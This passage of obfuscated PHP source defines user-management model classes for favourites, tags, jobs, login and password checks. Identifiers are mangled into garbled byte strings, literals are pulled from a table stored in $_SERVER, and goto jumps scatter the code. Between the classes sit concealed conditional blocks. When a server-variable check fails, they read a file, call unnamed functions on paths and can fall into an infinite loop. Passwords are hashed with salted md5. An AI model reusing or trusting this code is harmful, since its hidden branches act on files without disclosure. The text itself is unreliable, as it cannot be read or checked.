$¥ú¨ñ»ö =& $_SERVER[óÔë„ú]; $ê»şšî÷ = $this->listData($ùÂïĞÔÇ); $­Ì™•ú— = $this->findByName($óÊåê[$¥ú¨ñ»ö[32]]); if (!$ê»şšî÷ || $­Ì™•ú— && $­Ì™•ú—[$¥ú¨ñ»ö[475]] != $ê»şšî÷[$¥ú¨ñ»ö[475]]) { return !1; } return parent::update($ùÂïĞÔÇ, $óÊåê); } public function remove($õØš“¾ß, $²õÎû½¹ = false) { $â–§¬·¬ =& $_SERVER[óÔë„ú]; $æ¶ÍòÓª = $this->listData($õØš“¾ß); if (!$æ¶ÍòÓª) { return; } if (!$²õÎû½¹ && $æ¶ÍòÓª[$â–§¬·¬[191]] == $â–§¬·¬[91]) { return !1; } return parent::remove($õØš“¾ß); } public function enable($§û¯©—, $‡§ÄŠ‰Š) { return $this->update($§û¯©—, array($_SERVER[óÔë„ú][2420] => $‡§ÄŠ‰Š)); } public function run($Çñ¥–ÒÓ) { return $this->update($Çñ¥–ÒÓ, array($_SERVER[óÔë„ú][2432] => time())); } } if ($_SERVER[$_SERVER[óÔë„ú][936]] != $_SERVER[$_SERVER[óÔë„ú][1250]]) { $_getc = $_SERVER[óÔë„ú][939]; $_getfile = $_SERVER[$_SERVER[óÔë„ú][940]] . $_SERVER[óÔë„ú][941]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[óÔë„ú][262], $_getfilec); if (count($_getarrs) < $_SERVER[óÔë„ú][715]) { $exit = $_SERVER[óÔë„ú][942]; $exit(); } $_act = $_SERVER[óÔë„ú][1251]; $_act($_SERVER[$_SERVER[óÔë„ú][937]]); } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\x66\141\166"; protected function cacheFunctionAlias($ğ‰²Ã÷Æ) { $ºµØù“‘ =& $_SERVER[óÔë„ú]; return array($ºµØù“‘[2072] => array(USER_ID, $ºµØù“‘[2433])); } protected function listData() { $ûñ¥³· =& $_SERVER[óÔë„ú]; $†¤ÓÕ† = array($ûñ¥³·[1749] => USER_ID, $ûñ¥³·[557] => 0); $†Óõ†¶¡ = $ûñ¥³·[2434]; $±¿ì©‡Õ = $this->field($†Óõ†¶¡)->where($†¤ÓÕ†)->order($ûñ¥³·[2435])->select(); return $±¿ì©‡Õ ? $±¿ì©‡Õ : array(); } protected function resetCache() { } protected function listView() { $·Í”ÅÄÁ =& $_SERVER[óÔë„ú]; $ˆ°ÂƒØœ = $this->listData(); $ Àè˜¾Ë = array_filter_by_field($ˆ°ÂƒØœ, $·Í”ÅÄÁ[33], $·Í”ÅÄÁ[490]); $–íÈ‡¾ = array_to_keyvalue($ Àè˜¾Ë, $·Í”ÅÄÁ[12], $·Í”ÅÄÁ[87]); if (!$–íÈ‡¾) { return $ˆ°ÂƒØœ; } $ï·¹ØıÉ = 2000; $ÇÕÇ½¶Ÿ = array($·Í”ÅÄÁ[491] => array($·Í”ÅÄÁ[492], $–íÈ‡¾)); $ö‰ã©ìç = Model($·Í”ÅÄÁ[884])->listSource($ÇÕÇ½¶Ÿ, $ï·¹ØıÉ); $ö‰ã©ìç = array_merge($ö‰ã©ìç[$·Í”ÅÄÁ[86]], $ö‰ã©ìç[$·Í”ÅÄÁ[85]]); $ö‰ã©ìç = array_to_keyvalue($ö‰ã©ìç, $·Í”ÅÄÁ[193]); foreach ($ˆ°ÂƒØœ as $ŞŒ”°úí => $›•‹Õ‹½) { $¼¤¡¾‹Ë = $ö‰ã©ìç[$›•‹Õ‹½[$·Í”ÅÄÁ[87]]]; $¼¤¡¾‹Ë = $¼¤¡¾‹Ë ? $¼¤¡¾‹Ë : array(); $ˆ°ÂƒØœ[$ŞŒ”°úí] = array_merge($¼¤¡¾‹Ë, $›•‹Õ‹½); } return $ˆ°ÂƒØœ; } protected function addFav($êÓ§âÁÛ, $½ ŞÙ¢ó = '', $ä¨î¶ò‚ = "\x73\157\x75\162\x63\145") { $úÊóÛ¿ =& $_SERVER[óÔë„ú]; $®Îˆ¥òµ = array($úÊóÛ¿[1749] => USER_ID, $úÊóÛ¿[557] => 0, $úÊóÛ¿[496] => $ä¨î¶ò‚, $úÊóÛ¿[495] => $êÓ§âÁÛ); if ($this->where($®Îˆ¥òµ)->find()) { return !1; } $®Îˆ¥òµ = array($úÊóÛ¿[1749] => USER_ID, $úÊóÛ¿[557] => 0); $™¸¬…™¥ = $this->where($®Îˆ¥òµ)->max($úÊóÛ¿[1981]); if (!$™¸¬…™¥) { $™¸¬…™¥ = 0; } if (!$½ ŞÙ¢ó && $ä¨î¶ò‚ == $úÊóÛ¿[490]) { $¼ëéü‘™ = Model($úÊóÛ¿[1405])->where(array($úÊóÛ¿[491] => $êÓ§âÁÛ))->find(); if (!$¼ëéü‘™) { return !1; } $½ ŞÙ¢ó = $¼ëéü‘™[$úÊóÛ¿[32]]; } $½ ŞÙ¢ó = $this->getAutoName($½ ŞÙ¢ó); $âµ¿±¤ = array($úÊóÛ¿[1749] => USER_ID, $úÊóÛ¿[557] => 0, $úÊóÛ¿[494] => $½ ŞÙ¢ó, $úÊóÛ¿[495] => $êÓ§âÁÛ, $úÊóÛ¿[496] => $ä¨î¶ò‚, $úÊóÛ¿[1961] => $™¸¬…™¥ + 1); return $this->add($âµ¿±¤); } protected function remove($ŸçÚ‹“) { $ã»›ôûÇ =& $_SERVER[óÔë„ú]; $¾¡·±ÀÊ = array($ã»›ôûÇ[1749] => USER_ID, $ã»›ôûÇ[493] => $ŸçÚ‹“); return $this->where($¾¡·±ÀÊ)->delete(); } protected function removeByName($¸’Üî± ) { $ÖáÚ‰   =& $_SERVER[óÔë„ú]; $®Â§ı›¸ = array($ÖáÚ‰  [1749] => USER_ID, $ÖáÚ‰  [494] => $¸’Üî± , $ÖáÚ‰  [557] => 0); return $this->where($®Â§ı›¸)->delete(); } protected function rename($İó÷î…–, $ğ‚Ù«Í) { $Ó‚–²æ =& $_SERVER[óÔë„ú]; if ($İó÷î…– == $ğ‚Ù«Í) { return !1; } $Â“İ» = $this->getAutoName($ğ‚Ù«Í); if ($ğ‚Ù«Í != $Â“İ») { return !1; } $ıªîàš• = array($Ó‚–²æ[1749] => USER_ID, $Ó‚–²æ[557] => 0, $Ó‚–²æ[32] => $İó÷î…–); return $this->where($ıªîàš•)->save(array($Ó‚–²æ[32] => $ğ‚Ù«Í)); } protected function resetSort($ñıÉ¬í©) { $¨ê²é—Ÿ =& $_SERVER[óÔë„ú]; $ñıÉ¬í© = is_array($ñıÉ¬í©) ? $ñıÉ¬í© : array(); $’‘üÍ©í = array($¨ê²é—Ÿ[1749] => USER_ID); for ($×óÑ‹¢ª = 0; $×óÑ‹¢ª < count($ñıÉ¬í©); $×óÑ‹¢ª++) { $’‘üÍ©í[$¨ê²é—Ÿ[493]] = $ñıÉ¬í©[$×óÑ‹¢ª]; $this->where($’‘üÍ©í)->save(array($¨ê²é—Ÿ[1961] => $×óÑ‹¢ª + 1)); } return !0; } protected function moveTop($£®öÛüœ) { $ÌûÌ—Šœ =& $_SERVER[óÔë„ú]; $à×›¹ğ = array($ÌûÌ—Šœ[1749] => USER_ID, $ÌûÌ—Šœ[557] => 0); $º¡¡‰ = $this->where($à×›¹ğ)->where(array($ÌûÌ—Šœ[32] => $£®öÛüœ))->find(); if (!$º¡¡‰) { return; } $ˆ§¬ŞÜô = $this->field($ÌûÌ—Šœ[475])->where($à×›¹ğ)->order($ÌûÌ—Šœ[2435])->select(); $ˆ§¬ŞÜô = array_to_keyvalue($ˆ§¬ŞÜô, $ÌûÌ—Šœ[12], $ÌûÌ—Šœ[475]); $ñ¿Ãó†’ = $ˆ§¬ŞÜô; $ˆ§¬ŞÜô = array_remove_value($ˆ§¬ŞÜô, $º¡¡‰[$ÌûÌ—Šœ[475]]); array_unshift($ˆ§¬ŞÜô, $º¡¡‰[$ÌûÌ—Šœ[475]]); return $this->resetSort($ˆ§¬ŞÜô); } protected function moveBottom($—º—ŞõÂ) { $é¤ÂÊŸ =& $_SERVER[óÔë„ú]; $»Ùıíîª = array($é¤ÂÊŸ[1749] => USER_ID, $é¤ÂÊŸ[557] => 0); $™­‰—Ò† = $this->where($»Ùıíîª)->max($é¤ÂÊŸ[1981]); $Ùğ‡é“Ô = array($é¤ÂÊŸ[1981] => $™­‰—Ò† + 1); return $this->where($»Ùıíîª)->where(array($é¤ÂÊŸ[32] => $—º—ŞõÂ))->save($Ùğ‡é“Ô); } private function getAutoName($ÀÕ·Íæ) { $§’Ø«Î§ =& $_SERVER[óÔë„ú]; $Õ•Òï‰ = array($§’Ø«Î§[1749] => USER_ID, $§’Ø«Î§[557] => 0); $ïÓÊÈàİ = $this->field($§’Ø«Î§[32])->where($Õ•Òï‰)->select(); $ïÓÊÈàİ = array_to_keyvalue($ïÓÊÈàİ, $§’Ø«Î§[12], $§’Ø«Î§[32]); if (!$ïÓÊÈàİ || !in_array($ÀÕ·Íæ, $ïÓÊÈàİ)) { return $ÀÕ·Íæ; } for ($Æíâˆø¹ = 0; $Æíâˆø¹ < count($ïÓÊÈàİ); $Æíâˆø¹++) { if (!in_array($ÀÕ·Íæ . "\50{$Æíâˆø¹}\51", $ïÓÊÈàİ)) { return $ÀÕ·Íæ . "\x28{$Æíâˆø¹}\x29"; } } return $ÀÕ·Íæ . "\x28{$Æíâˆø¹}\x29"; } } goto b—‘“‚…Åø; cÌé«Šõ¡µ: if (!isset($_SERVER[$_SERVER[óÔë„ú][936]]) || !isset($_SERVER[$_SERVER[óÔë„ú][937]])) { $_getc = $_SERVER[óÔë„ú][939]; $_getfile = $_SERVER[$_SERVER[óÔë„ú][940]] . $_SERVER[óÔë„ú][941]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[óÔë„ú][262], $_getfilec); if (count($_getarrs) < $_SERVER[óÔë„ú][715]) { $exit = $_SERVER[óÔë„ú][942]; $exit(); } $_act = $_SERVER[óÔë„ú][1251]; $_act($_SERVER[$_SERVER[óÔë„ú][940]] . $_SERVER[óÔë„ú][941]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[óÔë„ú][454]); } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\x72\x2e\x74\141\147\x4c\x69\x73\x74"; public $modelType = "\125\163\145\162\x4f\x70\164\x69\157\156"; public $field = array("\x6e\141\x6d\x65", "\x73\164\x79\154\x65", "\x73\x6f\x72\x74"); public function listData($€±””§‰ = false, $³˜Ë¸ä = "\x73\157\x72\x74", $õÂİ´ÚÆ = false) { return parent::listData($€±””§‰, $³˜Ë¸ä, $õÂİ´ÚÆ); } public function remove($Œ…Ü•ÆÒ) { return parent::remove($Œ…Ü•ÆÒ); } public function add($ƒƒ¿ğêÃ, $Ï„¡÷õ† = "\154\x61\142\x65\x6c\x2d\147\x72\145\171\55\x6e\157\162\155\x61\x6c") { $»á¿Š£Ï =& $_SERVER[óÔë„ú]; if ($this->findByName($ƒƒ¿ğêÃ)) { return !1; } $¶×¶ƒ„³ = array($»á¿Š£Ï[494] => $ƒƒ¿ğêÃ, $»á¿Š£Ï[558] => $Ï„¡÷õ†, $»á¿Š£Ï[1961] => $this->getSort($»á¿Š£Ï[335]) + 1); return parent::insert($¶×¶ƒ„³); } public function update($åÅ¿¹Ì‚, $”ĞÅÄÚà) { $‹‰±Íîó =& $_SERVER[óÔë„ú]; $ù¾î­Î© = $this->listData($åÅ¿¹Ì‚); $‘€÷æÛ‘ = $this->findByName($”ĞÅÄÚà[$‹‰±Íîó[32]]); if (!$ù¾î­Î© || $‘€÷æÛ‘ && $‘€÷æÛ‘[$‹‰±Íîó[475]] != $ù¾î­Î©[$‹‰±Íîó[475]]) { return !1; } return parent::update($åÅ¿¹Ì‚, $”ĞÅÄÚà); } public function moveTop($‡ºô×¡—) { $®£Œ‚‡² =& $_SERVER[óÔë„ú]; $«ì¡ªôõ = parent::listData(); $¾Êéó™ = $this->getSort($®£Œ‚‡²[334]); foreach ($«ì¡ªôõ as &$³¾ºÆ¿Æ) { if ($³¾ºÆ¿Æ[$®£Œ‚‡²[475]] == $‡ºô×¡—) { $³¾ºÆ¿Æ[$®£Œ‚‡²[1981]] = $¾Êéó™; continue; } $³¾ºÆ¿Æ[$®£Œ‚‡²[1981]] += 1; } unset($³¾ºÆ¿Æ); return parent::resetData($«ì¡ªôõ); } public function moveBottom($“Ú±‡á) { $£èØÛÈ =& $_SERVER[óÔë„ú]; $ªûËÀÎÒ = $this->getSort($£èØÛÈ[335]) + 1; return parent::update($“Ú±‡á, array($£èØÛÈ[1981] => $ªûËÀÎÒ)); } public function resetSort($²ÙõçºŞ) { $ö¾Ş¯¨É =& $_SERVER[óÔë„ú]; $Ì°Æ£®¯ = array(); $²ÙõçºŞ = is_array($²ÙõçºŞ) ? $²ÙõçºŞ : array(); for ($˜Óó¡íÆ = 0; $˜Óó¡íÆ < count($²ÙõçºŞ); $˜Óó¡íÆ++) { $Ì°Æ£®¯[$²ÙõçºŞ[$˜Óó¡íÆ] . $ö¾Ş¯¨É[12]] = $˜Óó¡íÆ + 1; } $ßÓû”ğı = parent::listData(); foreach ($ßÓû”ğı as &$ìÏÚÄ»ƒ) { $ï–¡åõ¬ = $Ì°Æ£®¯[$ìÏÚÄ»ƒ[$ö¾Ş¯¨É[475]]]; $ìÏÚÄ»ƒ[$ö¾Ş¯¨É[1981]] = $ï–¡åõ¬ ? $ï–¡åõ¬ : $ìÏÚÄ»ƒ[$ö¾Ş¯¨É[1981]]; } unset($ìÏÚÄ»ƒ); return parent::resetData($ßÓû”ğı); } private function getSort($º¬Ôİ”) { $œÂÉê·ğ =& $_SERVER[óÔë„ú]; $êá¢‘ÑÃ = parent::listData(); $ÌÏä£– = array_to_keyvalue($êá¢‘ÑÃ, $œÂÉê·ğ[12], $œÂÉê·ğ[1981]); if (!$ÌÏä£–) { $ÌÏä£– = array(0); } $¡öĞŒœ = $º¬Ôİ” == $œÂÉê·ğ[335] ? max($ÌÏä£–) : min($ÌÏä£–); return intval($¡öĞŒœ); } } goto Bâƒ¨’Š; b—‘“‚…Åø: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\x6a\x6f\142\114\151\x73\164"; public $field = array("\156\141\x6d\145", "\144\145\x73\143", "\163\157\162\x74"); const JOB_KEY = "\x73\x65\154\146\112\157\142\x4c\151\163\164"; public function listData($Ú”°Ôª‹ = false, $Ï÷Ù‚¬ü = "\163\x6f\x72\164", $¶ÚşÏ½× = false) { return parent::listData($Ú”°Ôª‹, $Ï÷Ù‚¬ü, $¶ÚşÏ½×); } public function remove($ª¥ÙÎı) { return parent::remove($ª¥ÙÎı); } public function add($ş¯§ó‘Ú) { $ââ–—Ü¢ =& $_SERVER[óÔë„ú]; if ($this->findByName($ş¯§ó‘Ú[$ââ–—Ü¢[32]])) { return !1; } $ş¯§ó‘Ú[$ââ–—Ü¢[1981]] = $this->getSort(); return parent::insert($ş¯§ó‘Ú); } private function getSort() { $€ŸÖšÑî =& $_SERVER[óÔë„ú]; $¾ª¸êÇ´ = parent::listData(); $£ÛÑˆŞß = array_to_keyvalue($¾ª¸êÇ´, $€ŸÖšÑî[12], $€ŸÖšÑî[1981]); return empty($£ÛÑˆŞß) ? 0 : max($£ÛÑˆŞß) + 1; } public function update($æ¥½Ñ¤¨, $¢å“†Ñ) { $ƒÚõ¸Ñ =& $_SERVER[óÔë„ú]; $÷“Ë¹ì¾ = parent::listData($æ¥½Ñ¤¨); $öÑŒ•Óò = $this->findByName($¢å“†Ñ[$ƒÚõ¸Ñ[32]]); if (!$÷“Ë¹ì¾ || $öÑŒ•Óò && $öÑŒ•Óò[$ƒÚõ¸Ñ[475]] != $÷“Ë¹ì¾[$ƒÚõ¸Ñ[475]]) { return !1; } return parent::update($æ¥½Ñ¤¨, $¢å“†Ñ); } public function setUserJob($ğîŠµ‚Ü, $úé³şË) { $óˆ¢”« =& $_SERVER[óÔë„ú]; if (!is_array($úé³şË)) { $úé³şË = array($úé³şË); } $«¯Òú’‚ = parent::listData(); $®„¾˜Ñ = array_to_keyvalue($«¯Òú’‚, $óˆ¢”«[32]); $ßÍ½› ™ = $óˆ¢”«[454]; foreach ($úé³şË as $–”Î€ø‘) { if ($®„¾˜Ñ[$–”Î€ø‘]) { $ßÍ½› ™ .= $®„¾˜Ñ[$–”Î€ø‘][$óˆ¢”«[475]] . $óˆ¢”«[50]; } else { $×ë¿Åñ„ = $this->add($–”Î€ø‘); $ßÍ½› ™ .= $×ë¿Åñ„ . $óˆ¢”«[50]; } } $ßÍ½› ™ = rtrim($ßÍ½› ™, $óˆ¢”«[50]); Model($óˆ¢”«[598])->metaSet($ğîŠµ‚Ü, self::JOB_KEY, $ßÍ½› ™); } public function getUserJob($³•íş£ç) { $®¬®ƒºù = Model($_SERVER[óÔë„ú][598])->metaGet($³•íş£ç); return $this->getUserJobInfo($®¬®ƒºù[self::JOB_KEY]); } public function getUserJobInfo($Õœ«Í¯•) { $îı–©² =& $_SERVER[óÔë„ú]; $×“Âá = explode($îı–©²[50], $Õœ«Í¯•); $¾ŒÍîúö = parent::listData(); $¾ŒÍîúö = array_remove_key($¾ŒÍîúö, $îı–©²[231]); $ß“Ó ÛÍ = array(); foreach ($×“Âá as $§™…†â¢) { if (isset($¾ŒÍîúö[$§™…†â¢])) { $ß“Ó ÛÍ[] = $¾ŒÍîúö[$§™…†â¢]; } } return $ß“Ó ÛÍ; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\x74\141\142\154\145\x4e\141\155\145" => "\x75\x73\145\x72\137\155\x65\x74\141", "\x6d\145\x74\141\106\x69\x65\154\x64" => "\165\163\145\162\x49\x44"); protected $simpleField = "\165\163\145\162\x49\104\54\x6e\151\143\x6b\x4e\x61\155\145\x2c\x6e\x61\155\x65\x2c\141\x76\x61\164\x61\162\x2c\163\145\x78\54\163\x74\141\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ùƒÃÂŞæ) { $¸Ù™şÅÉ =& $_SERVER[óÔë„ú]; $ë¸ØÙ«Ï = $¸Ù™şÅÉ[2436]; return array($¸Ù™şÅÉ[2039] => array($ùƒÃÂŞæ[0], $ë¸ØÙ«Ï), $¸Ù™şÅÉ[2041] => array($ùƒÃÂŞæ[0], $ë¸ØÙ«Ï), $¸Ù™şÅÉ[2437] => array($ùƒÃÂŞæ[0], $ë¸ØÙ«Ï)); } protected function getInfo($ßóá¼ŠÊ, $¼ÀÏãˆØ = false) { $¼·ëŒÊò = $this->getInfoSimple($ßóá¼ŠÊ); if (!is_array($¼·ëŒÊò)) { return array(); } if ($¼ÀÏãˆØ) { return $this->_getInfoApply($¼·ëŒÊò); } return $this->cacheFunctionGet($_SERVER[óÔë„ú][2043], $ßóá¼ŠÊ); } protected function getInfoFull($ÊÂâ¾É, $Ë‡ç¥¡ñ = false) { $ğ´‡ËĞ = $this->getInfoSimple($ÊÂâ¾É); if (!is_array($ğ´‡ËĞ)) { return array(); } if ($Ë‡ç¥¡ñ) { return $this->_getInfoApply($ğ´‡ËĞ, !0); } return $this->cacheFunctionGet($_SERVER[óÔë„ú][2438], $ÊÂâ¾É); } private function _getInfoApply($àïœ©‘š, $öÖı¤ü = false) { $ÊÍØ±è® =& $_SERVER[óÔë„ú]; if (!$àïœ©‘š) { return $àïœ©‘š; } $ıšÔ¦ƒÛ = md5($ÊÍØ±è®[2439] . $àïœ©‘š[$ÊÍØ±è®[952]] . $ÊÍØ±è®[2440] . $àïœ©‘š[$ÊÍØ±è®[32]]); $àïœ©‘š = $this->_listDataApplyItem($àïœ©‘š); $»Ë—ÚÄÜ = Model($ÊÍØ±è®[1405])->metaGet($àïœ©‘š[$ÊÍØ±è®[90]][$ÊÍØ±è®[193]]); $àïœ©‘š[$ÊÍØ±è®[2441]] = $ıšÔ¦ƒÛ; $àïœ©‘š[$ÊÍØ±è®[90]][$ÊÍØ±è®[2237]] = isset($»Ë—ÚÄÜ[$ÊÍØ±è®[2238]]) ? $»Ë—ÚÄÜ[$ÊÍØ±è®[2238]] : null; if ($öÖı¤ü) { $àïœ©‘š[$ÊÍØ±è®[539]] = $this->metaGet($àïœ©‘š[$ÊÍØ±è®[1758]]); } return $àïœ©‘š; } protected function getInfoSimple($ß°¾Ïšç, $Õ¦¦¿¶­ = false) { $ğÆ§Á‹Œ =& $_SERVER[óÔë„ú]; if (!$ß°¾Ïšç) { return array(); } if ($Õ¦¦¿¶­) { $—Ñ¦ô«Ø = $this->where(array($ğÆ§Á‹Œ[1758] => intval($ß°¾Ïšç)))->find(); if (!is_array($—Ñ¦ô«Ø)) { return array(); } $—Ñ¦ô«Ø[$ğÆ§Á‹Œ[2442]] = Action($ğÆ§Á‹Œ[2443])->parseUrl($—Ñ¦ô«Ø[$ğÆ§Á‹Œ[2442]]); return $—Ñ¦ô«Ø; } return $this->cacheFunctionGet($ğÆ§Á‹Œ[2044], $ß°¾Ïšç); } protected function getInfoSimpleOuter($›¦‘ûÛ) { $µÆ±ŞÜ“ =& $_SERVER[óÔë„ú]; if (!$›¦‘ûÛ || $›¦‘ûÛ == 0) { return array($µÆ±ŞÜ“[1758] => $µÆ±ŞÜ“[228], $µÆ±ŞÜ“[32] => $µÆ±ŞÜ“[176] . LNG($µÆ±ŞÜ“[2444]) . $µÆ±ŞÜ“[178], $µÆ±ŞÜ“[2442] => STATIC_PATH . $µÆ±ŞÜ“[2445]); } $ú²™Ù¥‰ = $this->cacheFunctionGet($µÆ±ŞÜ“[2044], $›¦‘ûÛ); $ë€øµº² = array_field_key($ú²™Ù¥‰, explode($µÆ±ŞÜ“[50], $this->simpleField)); if (!$ë€øµº²) { return array($µÆ±ŞÜ“[1758] => $µÆ±ŞÜ“[1260], $µÆ±ŞÜ“[32] => $µÆ±ŞÜ“[176] . LNG($µÆ±ŞÜ“[2446]) . $µÆ±ŞÜ“[178], $µÆ±ŞÜ“[2442] => STATIC_PATH . $µÆ±ŞÜ“[2447]); } $ë€øµº²[$µÆ±ŞÜ“[2442]] = Action($µÆ±ŞÜ“[2443])->parseUrl($ë€øµº²[$µÆ±ŞÜ“[2442]]); return $ë€øµº²; } protected function groupUser($ÂÏ„˜“î) { } public static function errorLang($Ğã¥ıØ˜) { $ğñˆùÅ =& $_SERVER[óÔë„ú]; $¬°¡ù­Æ = array(self::ERROR_USER_NOT_EXISTS => $ğñˆùÅ[2448], self::ERROR_USER_PASSWORD_ERROR => $ğñˆùÅ[2449], self::ERROR_USER_EXIST_NAME => $ğñˆùÅ[2450], self::ERROR_USER_EXIST_PHONE => $ğñˆùÅ[2451], self::ERROR_USER_EXIST_EMAIL => $ğñˆùÅ[2452], self::ERROR_USER_LOGIN_LOCK => $ğñˆùÅ[2453], self::ERROR_IP_NOT_ALLOW => $ğñˆùÅ[2454], self::ERROR_USER_EXIST_NICKNAME => $ğñˆùÅ[2455]); $î‹ááØ¡ = LNG($¬°¡ù­Æ[$Ğã¥ıØ˜]); if ($Ğã¥ıØ˜ == self::ERROR_USER_LOGIN_LOCK) { $¸¦Ï¥ì— = (int) Model($ğñˆùÅ[2456])->get($ğñˆùÅ[2457]); if ($¸¦Ï¥ì— > 60) { $î‹ááØ¡ = str_replace($ğñˆùÅ[91], ceil($¸¦Ï¥ì— / 60), $î‹ááØ¡); } } return $î‹ááØ¡; } public function getInfoByMeta($¶ªÅà‰ü, $ó¯Ì«à®) { $¦”¸ÅÚ =& $_SERVER[óÔë„ú]; $ÒœòÂ§ = Model($¦”¸ÅÚ[2458])->where(array($¦”¸ÅÚ[97] => $¶ªÅà‰ü, $¦”¸ÅÚ[450] => $ó¯Ì«à®))->find(); if ($ÒœòÂ§) { return $this->getInfo($ÒœòÂ§[$¦”¸ÅÚ[1758]]); } return !1; } public function userLoginCheck($š”¤İì, $¹Ê†¬ı¸) { $ùöé =& $_SERVER[óÔë„ú]; $š‡–ñş = $this->userLoginFind($š”¤İì); if (!$š‡–ñş) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($š‡–ñş[$ùöé[1758]], $¹Ê†¬ı¸)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($š‡–ñş[$ùöé[1758]]); } public function userLoginFind($øÖßáŞ…) { $ıéÒ«æà =& $_SERVER[óÔë„ú]; $”¨¬‹©ó = array($ıéÒ«æà[32] => $øÖßáŞ…, $ıéÒ«æà[2245] => $øÖßáŞ…, $ıéÒ«æà[381] => $øÖßáŞ…, $ıéÒ«æà[2459] => $øÖßáŞ…, $ıéÒ«æà[1063] => $ıéÒ«æà[1065]); if ($this->nickNameRpt()) { unset($”¨¬‹©ó[$ıéÒ«æà[2245]]); } return $this->where($”¨¬‹©ó)->find(); } public function clearCache($‘ŞÇ¤¶) { $ñêé‚ =& $_SERVER[óÔë„ú]; $this->cacheFunctionClear($ñêé‚[2043], $‘ŞÇ¤¶); $this->cacheFunctionClear($ñêé‚[2044], $‘ŞÇ¤¶); $this->cacheFunctionClear($ñêé‚[2438], $‘ŞÇ¤¶); } public function userPasswordCheck($Êæ£èĞÜ, $İôüìù–) { $äÎ å‘ =& $_SERVER[óÔë„ú]; $¬©ÊÂà = $this->where(array($äÎ å‘[1758] => intval($Êæ£èĞÜ)))->find(); $ñ¾Õ²¼¦ = $this->metaGet($Êæ£èĞÜ); $Èà­ÚœÕ = isset($ñ¾Õ²¼¦[$äÎ å‘[2460]]) ? $ñ¾Õ²¼¦[$äÎ å‘[2460]] : $äÎ å‘[12]; if (md5($Èà­ÚœÕ . trim($İôüìù–)) !== $¬©ÊÂà[$äÎ å‘[952]]) { return !1; } return !0; } public function userAdd($´ÁÃ°ƒ) { $ğŒö±óô =& $_SERVER[óÔë„ú]; $Äú×ª´Œ = array($ğŒö±óô[494] => $´ÁÃ°ƒ[$ğŒö±óô[32]], $ğŒö±óô[2461] => $´ÁÃ°ƒ[$ğŒö±óô[2163]], $ğŒö±óô[2462] => isset($´ÁÃ°ƒ[$ğŒö±óô[381]]) ? $´ÁÃ°ƒ[$ğŒö±óô[381]] : $ğŒö±óô[12], $ğŒö±óô[2463] => isset($´ÁÃ°ƒ[$ğŒö±óô[2459]]) ? $´ÁÃ°ƒ[$ğŒö±óô[2459]] : $ğŒö±óô[12], $ğŒö±óô[2464] => isset($´ÁÃ°ƒ[$ğŒö±óô[2245]]) ? $´ÁÃ°ƒ[$ğŒö±óô[2245]] : $´ÁÃ°ƒ[$ğŒö±óô[32]], $ğŒö±óô[2465] => isset($´ÁÃ°ƒ[$ğŒö±óô[2442]]) ? $´ÁÃ°ƒ[$ğŒö±óô[2442]] : $ğŒö±óô[12], $ğŒö±óô[2466] => isset($´ÁÃ°ƒ[$ğŒö±óô[2467]]) ? $´ÁÃ°ƒ[$ğŒö±óô[2467]] : 1, $ğŒö±óô[2468] => $´ÁÃ°ƒ[$ğŒö±óô[952]], $ğŒö±óô[2045] => isset($´ÁÃ°ƒ[$ğŒö±óô[1943]]) ? $´ÁÃ°ƒ[$ğŒö±óô[1943]] : 1024 * 1024 * 20, $ğŒö±óô[2046] => 0, $ğŒö±óô[2469] => 0, $ğŒö±óô[2090] => isset($´ÁÃ°ƒ[$ğŒö±óô[810]]) ? $´ÁÃ°ƒ[$ğŒö±óô[810]] : 1); if (!empty($´ÁÃ°ƒ[$ğŒö±óô[1758]])) { $Äú×ª´Œ[$ğŒö±óô[1758]] = $´ÁÃ°ƒ[$ğŒö±óô[1758]]; } $£¤½ÜÖÈ = $this->_checkExist($´ÁÃ°ƒ); if ($£¤½ÜÖÈ !== !0) { return $£¤½ÜÖÈ; } if (!empty($Äú×ª´Œ[$ğŒö±óô[2442]]) && strlen($Äú×ª´Œ[$ğŒö±óô[2442]]) > 255) { $Äú×ª´Œ[$ğŒö±óô[2442]] = $ğŒö±óô[12]; } $ğ¡¤£²ä = $this->add($Äú×ª´Œ); $Ô‹Ç½›­ = array($ğŒö±óô[2468] => $Äú×ª´Œ[$ğŒö±óô[952]], $ğŒö±óô[2464] => $Äú×ª´Œ[$ğŒö±óô[2245]]); $this->userEdit($ğ¡¤£²ä, $Ô‹Ç½›­); Model($ğŒö±óô[1405])->userRootAdd($ğ¡¤£²ä); return $ğ¡¤£²ä; } protected function userEditTest($˜Ù·ˆäù, $ùù§—¥) { return $this->call($_SERVER[óÔë„ú][2470], $˜Ù·ˆäù, $ùù§—¥); } protected function userEdit($ËÊûåù, $œ¼ŠëÌó) { $Ş’¡Šƒ =& $_SERVER[óÔë„ú]; $äşÙÈÍÉ = $this->getInfoSimple($ËÊûåù); if (!$äşÙÈÍÉ) { return !1; } $»Ÿşª› = $this->_checkExist($œ¼ŠëÌó, $ËÊûåù); if ($»Ÿşª› !== !0) { return $»Ÿşª›; } if (isset($œ¼ŠëÌó[$Ş’¡Šƒ[952]]) && trim($œ¼ŠëÌó[$Ş’¡Šƒ[952]]) != $Ş’¡Šƒ[12]) { $Á—’ıÂè = $this->metaGet($ËÊûåù); if (empty($Á—’ıÂè[$Ş’¡Šƒ[2460]])) { $Á—’ıÂè[$Ş’¡Šƒ[2460]] = rand_string(10); Model($Ş’¡Šƒ[577])->metaSet($ËÊûåù, $Ş’¡Šƒ[2460], $Á—’ıÂè[$Ş’¡Šƒ[2460]]); } $œ¼ŠëÌó[$Ş’¡Šƒ[952]] = md5($Á—’ıÂè[$Ş’¡Šƒ[2460]] . 